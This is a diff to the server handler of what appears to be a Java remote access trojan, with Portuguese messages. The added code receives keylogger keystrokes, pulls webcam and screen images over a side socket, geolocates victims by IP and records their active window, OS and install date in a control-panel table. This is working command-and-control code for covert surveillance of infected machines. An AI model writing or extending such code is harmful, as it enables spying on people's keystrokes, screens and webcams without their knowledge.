@@ -31,7 +31,11 @@ public class ClientHandler implements Runnable {
     private String clientKey;
     private PrintWriter writer;
     private final String clientIp;
+    private String installDate = "00/00/0000 - 00:00:00";
     private String clientName = "Desconhecido";
+    private String location = "Não localizado";
+    private String os = "Desconhecido";
+    private String activeWindow = "Desconhecido";
     private boolean webcamLive = false;
     private boolean screenLive = false;
     private ServerSocket webcamSocket;
@@ -45,6 +49,12 @@ public class ClientHandler implements Runnable {
     private long screenMillis = 0L;
     private long webcamMillis = 0L;
     private boolean auth = false;
+    private int screens = 0;
+    private int webcams = 0;
+    private long ping = 0;
+
+    private BufferedImage screenImage;
+    private BufferedImage webcamImage;
 
     public JFrame CHAT_FRAME;
     public JTextArea CHAT_TEXT;
@@ -55,7 +65,8 @@ public class ClientHandler implements Runnable {
         this.clientSocket = socket;
         this.clientId = id;
         this.clientIp = clientSocket.getInetAddress().toString();
-        ConnectServer.msg("Recebendo conexão #" + clientId + " (" + clientIp + ")...");
+        this.location = ipLocation(this.clientIp);
+        ConnectServer.msg("Recebendo conexão #" + clientId + " (" + clientIp + "/" + this.location + ")...");
     }
 
     public Socket getClientSocket() {
@@ -114,11 +125,16 @@ public class ClientHandler implements Runnable {
                     clientName = command.replace("user:", "");
                     ConnectServer.msg("Conexão com cliente " + getClientInfo() + " estabelecida!");
                     auth = true;
+                    ConnectServerGUI.addClientToTable(getClientKey(), null, null, getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                     ServerAudioComponents.generateBeep(100, 1500, true);
                 } else if (!auth) {
-                    closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + ipLocation(getClientIP()) + ")");
+                    closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + this.location + ")");
                     ServerAudioComponents.generateBeep(100, 250, true);
                     return;
+                } else if (command.startsWith("date:")) {
+                    installDate = command.replace("date:", "");
+                } else if (command.startsWith("os:")) {
+                    os = command.replace("os:", "");
                 } else if (command.equalsIgnoreCase("ping")) {
                     ConnectServer.msg(getClientInfo() + ": " + (System.currentTimeMillis() - pingTest) + "ms");
                 } else if (command.startsWith("chat-msg:")) {
@@ -131,6 +147,43 @@ public class ClientHandler implements Runnable {
                     if (!message.isEmpty()) {
                         showChat(message);
                     }
+                } else if (command.equalsIgnoreCase("rping")) {
+                    pingTest = System.currentTimeMillis();
+                    send("r-ping");
+                } else if (command.equalsIgnoreCase("r-ping")) {
+                    ping = System.currentTimeMillis() - pingTest;
+                    ConnectServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                } else if (command.startsWith("updateinfo ")) {
+                    String[] args = command.split(" ", 4);
+                    screens = Integer.parseInt(args[1]);
+                    webcams = Integer.parseInt(args[2]);
+                    activeWindow = args[3];
+                    ConnectServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                } else if (command.startsWith("keylogger ")) {
+                    ConnectServer.msg(getClientInfo() + ": Tecla: " + command.substring(10));
+                } else if (command.equalsIgnoreCase("icon-screen") || command.equalsIgnoreCase("icon-webcam")) {
+                    boolean webcam = command.equalsIgnoreCase("icon-webcam");
+                    ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
+                        boolean first = true;
+                        JLabel label = null;
+                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + 9)) {
+                            try (Socket clientSocket = serverSocket.accept();
+                                 InputStream is = clientSocket.getInputStream()) {
+                                BufferedImage receivedImage = ImageIO.read(is);
+                                if (webcam) {
+                                    webcamImage = receivedImage;
+                                } else {
+                                    screenImage = receivedImage;
+                                }
+                                ConnectServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                            }
+                        } catch (Exception exception) {
+                            if (exception.getMessage() != null && exception.getMessage().equalsIgnoreCase("Socket closed")) {
+                                return;
+                            }
+                            ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao abrir o servidor de icone");
+                        }
+                    }).start(), 1, TimeUnit.SECONDS);
                 } else if (command.equalsIgnoreCase("screen-image") || command.equalsIgnoreCase("screen-live") ||
                         command.equalsIgnoreCase("webcam-image") || command.equalsIgnoreCase("webcam-live")
                         || command.equalsIgnoreCase("view-image")) {
@@ -476,7 +529,7 @@ public class ClientHandler implements Runnable {
                 } else {
                     ConnectServer.msg(getClientInfo() + ": " + command);
                     if (command.contains("Interfaces USB:") || command.contains("Separador de Linha:")) {
-                        ConnectServer.msg(getClientInfo() + ": IP: " + getClientIP() + " (" + ipLocation(getClientIP()) + ")");
+                        ConnectServer.msg(getClientInfo() + ": IP: " + getClientIP() + " (" + this.location + ")");
                     }
                 }
             }
@@ -505,6 +558,7 @@ public class ClientHandler implements Runnable {
             ConnectServer.CONNECTED_KEYS.remove(getClientKey());
         }
         ConnectServer.CLIENTS.remove(getClientId());
+        ConnectServerGUI.removeClientFromTable(getClientKey());
 
         // Remove o ID da combo na GUI
         ConnectServerGUI.removeClient(String.valueOf(getClientId()));
